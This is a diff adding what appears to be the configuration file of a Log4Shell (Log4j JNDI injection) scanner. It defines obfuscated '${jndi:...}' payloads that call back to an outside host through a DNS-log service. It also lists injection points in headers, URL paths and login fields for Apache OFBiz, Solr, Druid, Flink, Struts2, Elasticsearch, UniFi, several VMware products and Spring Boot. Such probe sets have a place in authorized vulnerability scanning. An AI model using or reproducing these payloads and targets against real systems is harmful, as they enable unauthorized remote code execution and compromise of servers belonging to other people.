@@ -1,0 +1,142 @@
+DefaultPoc  = true
+DefaultPayload = "${jndi:${lower:d}${lower:n}${lower:s}://*ip*:*port*<#>}"
+UseDnsLog = true
+
+[ceye]
+domain = ""
+token = ""
+
+[[request]]
+name = "Apche OFBiz"
+path = "/webtools/control/main"
+method = "GET"
+header = [ "Cookie: OFBiz.Visitor=*payload*"]
+
+[[request]]
+name = "Apche OFBiz"
+path = "/webtools/control/setLocaleFromBrowser"
+method = "POST"
+header = [ "Content-Type: text/html;charset=UTF-8*payload*" ]
+
+[[request]]
+name = "Apache Solr"
+path = "/solr/admin/cores?action=CREATE&name=*payload*&wt=json"
+method = "GET"
+
+[[request]]
+name = "Apache Solr"
+path = "/solr/admin/cores?_=&action=&config=&dataDir=&instanceDir=*payload*&name=&schema=&wt="
+method = "GET"
+
+[[request]]
+name = "Apache Solr"
+path = "/solr/admin/info/system?_=*payload*&wt=json"
+method = "GET"
+
+[[request]]
+name = "Apache Solr"
+path = "/solr/admin/collections?action=*payload*&wt=json"
+method = "GET"
+
+[[request]]
+name = "Apache Druid"
+path = "/druid/coordinator/*payload*"
+method = "GET"
+
+[[request]]
+name = "Apache Druid"
+path = "/druid/indexer/*payload*"
+method = "GET"
+
+[[request]]
+name = "Apache Druid"
+path = "/druid/v2/*payload*"
+method = "GET"
+
+[[request]]
+name = "Apache JSPWiki"
+path = "/wiki/*payload*"
+payload = "${jndi:dns:${::-/}/*ip*:*port*<#>}"
+method = "GET"
+
+[[request]]
+name = "Apache JSPWiki"
+path = "/Edit.jsp?page=Main"
+method = "GET"
+header = [ "X-Forwarded-For:*payload*" ]
+
+[[request]]
+name = "Apache Filnk"
+path = "/jars/*payload*.jar/run"
+payload = "${jndi:dns:%252f%252f*ip*:*port*<#**>}"
+method = "POST"
+
+[[request]]
+name = "Apache SkyWalking"
+path = "/graphql"
+method = "POST"
+body = [ "data: {\"query\":\"*payload*\",\"variables\":{\"duration\":{\"start\":\"2021-12-22 1259\",\"end\":\"2021-12-22 1314\",\"step\":\"MINUTE\"}}}" ]
+
+[[request]]
+name = "Struts2"
+path = "/Struts2WebAppDemo/index.action?__checkbox_*payload*=a&__checkbox_*payload*=b"
+method = "GET"
+
+[[request]]
+name = "Elasticsearch"
+path = "/_search?q=*payload*"
+method = "GET"
+
+[[request]]
+name = "UniFi Network"
+path = "/api/login"
+method = "POST"
+body = [ "{\"*payload*\": \"\"}" ]
+
+
+#以下payload可参考：https://github.com/NS-Sp4ce/Vm4J
+[[request]]
+name = "Vmware HCX"
+path = "/hybridity/api/sessions"
+method = "POST"
+header = [ "Content-Type: application/json; charset=UTF-8" ]
+body = [ "{\"authType\": \"password\",\"username\": \"*payload*\",\"password\": \"vm4j\"}" ]
+
+[[request]]
+name = "Vmware Horizon"
+path = "/portal/info.jsp"
+method = "GET"
+header = [ "Accept-Language: *payload*" ]
+
+[[request]]
+name = "Vmware NSX"
+path = "/j_spring_security_check"
+method = "POST"
+header = [ "Content-Type: application/json; charset=UTF-8" ]
+body = [ "j_username=*payload*&j_password=vm4j&submit-btn=vm4j" ]
+
+[[request]]
+name = "VMware vRealize Operations Manager"
+path = "/ui/login.action"
+method = "POST"
+header = [ "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" ]
+body = [ "mainAction=login&userName=*payload*&password=aaaaa&authSourceId=localItem&authSourceType=LOCAL" ]
+
+[[request]]
+name = "VMware vCenter"
+path = "/"
+method = "POST"
+header = [ "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" , "X-Forwarded-For: *payload*"]
+body = [ "CastleAuthorization=Basic%20dm00ajp2bTRq" ]
+
+[[request]]
+name = "springboot"
+path = "/"
+header = [ "Accept: text/html*payload*"]
+method = "POST"
+
+[[request]]
+name = "springboot"
+path = "/"
+header = [ "Accept: text/html;charset=*payload*"]
+method = "POST"
